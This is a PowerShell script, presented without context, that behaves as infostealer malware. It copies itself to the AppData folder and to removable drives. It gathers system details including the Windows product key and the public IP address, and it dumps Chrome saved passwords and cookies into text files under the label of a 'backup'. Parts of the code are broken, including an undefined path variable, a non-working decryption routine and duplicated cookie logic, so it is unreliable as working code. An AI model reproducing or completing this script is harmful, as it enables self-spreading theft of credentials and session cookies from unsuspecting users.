$ScriptFile = Get-Item -Path $MyInvocation.MyCommand.Path
$ScriptBytes = Get-Content -Path $ScriptFile.FullName -Encoding Byte
$ScriptPath = Join-Path -Path $AppDataPath -ChildPath $ScriptFile.Name
$Path = $env:appdata

# Check if running on a removable drive and move to %appdata% folder if true
$RemovableDrive = Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -First 1
if ($RemovableDrive -ne $null) {
    Write-Output "Running on a removable drive. Moving to %appdata% folder."
    if (-not (Test-Path -Path $ScriptPath)) {
        Move-Item -Path $ScriptFile.FullName -Destination $ScriptPath
        Set-Location $Path
    }
} else {
    if ($RemovableDrive -eq $null) {
        $RemovableDrive = Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -First 1
    }
    if ($RemovableDrive -ne $null) {
        $FilePath = Join-Path $RemovableDrive.DeviceID $ScriptFile
        $File = New-Item $FilePath -ItemType File
        Set-Content -Path $FilePath -Value $ScriptBytes -Encoding Byte
        Write-Output "File '$ScriptFile' created on drive $($RemovableDrive.DeviceID) and file bytes written."
    } else {
        Write-Output "No removable drives found."
    }
}

# Create system information output file
$OutputFile = Join-Path -Path $Path -ChildPath "systeminfo.txt"
New-Item -Path $OutputFile -ItemType File -Force | Out-Null

# Get system information and output to file
$ComputerName = $env:COMPUTERNAME
$UserName = $env:USERNAME
$OsInfo = Get-WmiObject -Class Win32_OperatingSystem
if (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion") {
    $WinProductKey = Get-ItemPropertyValue "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" "DigitalProductId"
}
else {
    $WinProductKey = "None"
}
$SystemInfo = @{
    'Computer Name' = $ComputerName
    'User Name' = $UserName
    'Operating System' = $OsInfo.Caption
    'Version' = $OsInfo.Version
    'Product Key' = $WinProductKey
    'RAM' = "{0:N2} GB" -f ($OsInfo.TotalVisibleMemorySize / 1GB)
    'CPU' = (Get-CimInstance -Class Win32_Processor).Name
    'GPU' = (Get-CimInstance -Class Win32_VideoController).Name
    'Cores' = (Get-CimInstance -Class Win32_Processor).NumberOfCores
    'Disk Space' = "{0:N2} GB" -f (Get-CimInstance -Class Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
    'Local IP' = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
    'Public IP' = ((Invoke-WebRequest ifconfig.me/ip).Content).Trim()
}

$SystemInfo.GetEnumerator() | ForEach-Object {
    $Line = $_.Name + ": " + $_.Value
    Add-Content -Path $OutputFile -Value $Line
}

# Backup Chrome passwords
$ChromePasswordsFile = "Chromepass.txt"

function Get-ChromePassword {
    param ($password)
    $Win32Crypt = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList "", $password
    $decrypt = $Win32Crypt.GetNetworkCredential().Password
    return $decrypt
}

function Backup-ChromePasswords {
    $ChromeDB = "Login Data"
    $AppData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    if (!(Test-Path $AppData)) {
        Write-Output "Chrome user data not found."
        return
    }
    $SqlConnection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$AppData\$ChromeDB")
    $SqlConnection.Open()
    $SqlCommand = $SqlConnection.CreateCommand()
    $SqlCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins"
    $SqlDataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($SqlCommand)
    $DataSet = New-Object System.Data.DataSet
    $SqlDataAdapter.Fill($DataSet) | Out-Null
    $SqlConnection.Close()
    if ($DataSet.Tables.Count -eq 0) {
        Write-Output "No Chrome passwords found."
        return
    }
    $Data = $DataSet.Tables[0] | Select-Object -ExpandProperty Rows
    $Passwords = foreach ($row in $Data) {
        $url = $row.ItemArray[0]
        $username = $row.ItemArray[1]
        $encrypted_password = $row.ItemArray[2]
        $password = Get-ChromePassword -password $encrypted_password
        [PSCustomObject] @{
            "URL" = $url
            "Username" = $username
            "Password" = $password
        }
    }
    $Passwords | Export-Csv -Path $ChromePasswordsFile -NoTypeInformation
    Write-Output "Chrome passwords backed up to '$ChromePasswordsFile'."
}

# Backup Chrome cookies
$ChromeCookiesFile = "Chromecookies.txt"

function Get-ChromeCookie {
    param ($cookie)
    $Win32Crypt = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList "", $cookie
    $decrypt = $Win32Crypt.GetNetworkCredential().Password
    return $decrypt
}

$ChromeCookieDb = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Cookies"

if (Test-Path $ChromeCookieDb) {
    Write-Output "Chrome cookie database found at $ChromeCookieDb"
    $Conn = New-Object -ComObject ADODB.Connection
    $RS = New-Object -ComObject ADODB.Recordset
    $Conn.Open("Provider=SQLite3OLEDB.1;Data Source=$ChromeCookieDb")
    $RS.Open("SELECT * FROM cookies", $Conn, 1, 3)
    if ($RS.EOF -ne $true) {
        $ChromeCookies = $RS.GetRows()
        $RS.Close()
        $Conn.Close()

        $CookieData = @()
        $Fields = $RS.Fields.Count
        $Rows = $RS.RecordCount
        for ($i = 0; $i -lt $Rows; $i++) {
            $Record = [ordered]@{}
            for ($j = 0; $j -lt $Fields; $j++) {
                $Value = $ChromeCookies[$j, $i]
                if ($Value -is [byte[]]) {
                    $Value = Get-ChromeCookie $Value
                }
                $Record[$RS.Fields.Item($j).Name] = $Value
            }
            $CookieData += New-Object PSObject -Property $Record
        }
        $CookieData | Export-Csv -Path $ChromeCookiesFile -NoTypeInformation -Encoding UTF8
        Write-Output "Chrome cookies backup saved to $ChromeCookiesFile"
    } else {
        Write-Output "Chrome cookie database is empty"
    }
} else {
    Write-Output "Chrome cookie database not found"
}

Function Backup-ChromeCookies {
    $UserName = Get-Content env:USERNAME
    $ChromeCookieDb = Get-ChildItem -Path "C:\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\" -Filter "Cookies"
    $OutputFile = Join-Path $PSScriptRoot "Chromecookies.txt"

    If (Test-Path $ChromeCookieDb) {
        # Load cookies database and query cookies
        $Cookies = New-Object -ComObject ADODB.Connection
        $Cookies.Open("Driver={SQLite3 ODBC Driver};Database=$ChromeCookieDb;")

        $CookieQuery = "SELECT * FROM cookies;"
        $CookieRecordSet = $Cookies.Execute($CookieQuery)

        # Write cookies to output file
        While (-Not $CookieRecordSet.EOF) {
            $CookieData = @{
                "Host" = $CookieRecordSet.Fields.Item("host").Value
                "Name" = $CookieRecordSet.Fields.Item("name").Value
                "Value" = $CookieRecordSet.Fields.Item("value").Value
                "Path" = $CookieRecordSet.Fields.Item("path").Value
                "Secure" = $CookieRecordSet.Fields.Item("secure").Value
                "Expires" = $CookieRecordSet.Fields.Item("expires_utc").Value
            }
            $CookieData | Out-File -FilePath $OutputFile -Append
            $CookieRecordSet.MoveNext()
        }

        $Cookies.Close()
        Write-Output "Chrome cookies successfully backed up to '$OutputFile'."
    } else {
        Write-Output "Could not find Chrome cookie database."
    }
}
